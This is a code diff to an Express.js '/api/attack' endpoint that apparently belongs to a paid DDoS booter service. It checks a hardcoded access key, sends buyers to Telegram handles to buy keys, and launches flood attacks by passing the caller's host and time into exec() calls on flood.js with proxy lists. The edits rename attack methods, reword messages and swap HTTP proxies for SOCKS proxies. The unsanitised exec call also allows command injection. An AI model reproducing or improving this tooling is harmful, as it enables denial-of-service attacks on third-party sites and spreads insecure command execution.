@@ -20,7 +20,7 @@ app.get("/api/attack", (req, res) => {
   if (key !== "tbaodz") {
     const err_key = {
       status: `error`,
-      message: `Error Keys | Dms Buy Key : t.me/haibe206`,
+      message: `Error Keys | Dms Buy Key : t.me/scrvipbytbao`,
       info: `t.me/haibe206`,
     };
     return res.status(400).send(err_key);
@@ -45,7 +45,7 @@ app.get("/api/attack", (req, res) => {
 
   if (
     !(
-      method.toLowerCase() === "flooder" ||
+      method.toLowerCase() === "flood" ||
       method.toLowerCase() === "storm" ||
       method.toLowerCase() === "https" ||
       method.toLowerCase() === "bypass" ||
@@ -63,7 +63,7 @@ app.get("/api/attack", (req, res) => {
 
   const jsonData = {
     status: `success`,
-    message: `Send Attack Successful`,
+    message: `Attack successfully sent`,
     host: `${host}`,
     port: `${port}`,
     time: `${time}`,
@@ -90,9 +90,9 @@ app.get("/api/attack", (req, res) => {
       },
     );
   }
-  if (method.toLowerCase() === "flooder") {
+  if (method.toLowerCase() === "flood") {
     exec(
-      `node flood.js ${host} ${time} 128 32 http.txt`,
+      `node flood.js ${host} ${time} 32 8 socks.txt`,
       (error, stdout, stderr) => {
         if (error) {
           console.error(`Error: ${error.message}`);
